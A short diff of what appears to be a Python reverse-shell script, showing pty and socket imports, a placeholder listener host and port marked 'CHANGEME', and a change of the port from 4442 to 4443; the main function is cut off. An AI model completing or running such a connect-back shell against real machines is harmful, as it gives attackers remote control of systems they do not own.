@@ -3,7 +3,7 @@ import pty
 import socket
 
 lhost = "127.0.0.1"  # XXX: CHANGEME
-lport = 4442  # XXX: CHANGEME
+lport = 4443  # XXX: CHANGEME
 
 
 def main():
